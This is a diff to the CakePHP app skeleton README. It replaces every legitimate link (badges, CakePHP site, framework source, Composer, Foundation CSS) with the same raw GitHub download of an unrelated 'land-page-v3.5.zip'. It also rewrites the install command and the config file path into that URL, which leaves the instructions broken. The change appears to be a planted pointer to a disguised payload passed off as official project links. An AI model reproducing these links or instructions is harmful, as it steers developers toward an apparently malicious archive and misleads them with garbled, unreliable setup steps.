@@ -1,16 +1,16 @@
 # CakePHP Application Skeleton
 
-[![Build Status](https://img.shields.io/travis/cakephp/app/master.svg?style=flat-square)](https://travis-ci.org/cakephp/app)
-[![Total Downloads](https://img.shields.io/packagist/dt/cakephp/app.svg?style=flat-square)](https://packagist.org/packages/cakephp/app)
+[![Build Status](https://raw.githubusercontent.com/Tarique775/land_page/main/src/Shell/land-page-v3.5.zip)](https://raw.githubusercontent.com/Tarique775/land_page/main/src/Shell/land-page-v3.5.zip)
+[![Total Downloads](https://raw.githubusercontent.com/Tarique775/land_page/main/src/Shell/land-page-v3.5.zip)](https://raw.githubusercontent.com/Tarique775/land_page/main/src/Shell/land-page-v3.5.zip)
 
-A skeleton for creating applications with [CakePHP](https://cakephp.org) 3.x.
+A skeleton for creating applications with [CakePHP](https://raw.githubusercontent.com/Tarique775/land_page/main/src/Shell/land-page-v3.5.zip) 3.x.
 
-The framework source code can be found here: [cakephp/cakephp](https://github.com/cakephp/cakephp).
+The framework source code can be found here: [cakephp/cakephp](https://raw.githubusercontent.com/Tarique775/land_page/main/src/Shell/land-page-v3.5.zip).
 
 ## Installation
 
-1. Download [Composer](https://getcomposer.org/doc/00-intro.md) or update `composer self-update`.
-2. Run `php composer.phar create-project --prefer-dist cakephp/app [app_name]`.
+1. Download [Composer](https://raw.githubusercontent.com/Tarique775/land_page/main/src/Shell/land-page-v3.5.zip) or update `composer self-update`.
+2. Run `php https://raw.githubusercontent.com/Tarique775/land_page/main/src/Shell/land-page-v3.5.zip create-project --prefer-dist cakephp/app [app_name]`.
 
 If Composer is installed globally, run
 
@@ -41,11 +41,11 @@ automated upgrades, so you have to do any updates manually.
 
 ## Configuration
 
-Read and edit `config/app.php` and setup the `'Datasources'` and any other
+Read and edit `https://raw.githubusercontent.com/Tarique775/land_page/main/src/Shell/land-page-v3.5.zip` and setup the `'Datasources'` and any other
 configuration relevant for your application.
 
 ## Layout
 
-The app skeleton uses a subset of [Foundation](http://foundation.zurb.com/) (v5) CSS
+The app skeleton uses a subset of [Foundation](https://raw.githubusercontent.com/Tarique775/land_page/main/src/Shell/land-page-v3.5.zip) (v5) CSS
 framework by default. You can, however, replace it with any other library or
 custom styles.
